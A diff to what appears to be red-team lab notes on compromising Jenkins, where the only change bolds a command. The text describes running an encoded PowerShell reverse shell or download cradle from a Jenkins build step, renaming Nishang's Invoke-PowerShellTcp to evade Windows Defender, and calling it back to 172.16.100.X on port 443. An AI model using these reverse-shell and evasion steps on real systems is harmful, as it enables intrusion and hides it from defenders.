@@ -143,7 +143,7 @@ Since Jenkins does not have a password policy many users use username as passwor
 
 Use the encodedcomand parameter of PowerShell to use an encoded reverse shell or use download execute cradle in Jenkins build step. You can use any reverse shell, below we are using a slightly modified version of Invoke-PowerShellTcp from Nishang. We renamed the function Invoke-PowerShellTcp to Power in the script to bypass Windows Defender.
 
-If using Invoke-PowerShellTcp, make sure to include the function call in the script Power -Reverse -IPAddress 172.16.100.X -Port 443 or append it at the end of the command in Jenkins. Please note that you may always like to rename the function name to something else to avoid detection.
+If using Invoke-PowerShellTcp, make sure to include the function call in the script **Power -Reverse -IPAddress 172.16.100.X -Port 443** or append it at the end of the command in Jenkins. Please note that you may always like to rename the function name to something else to avoid detection.
 
 **NOTE:** Upload Invoke-PowerShellTCP.ps1 script on HFS Server.
 
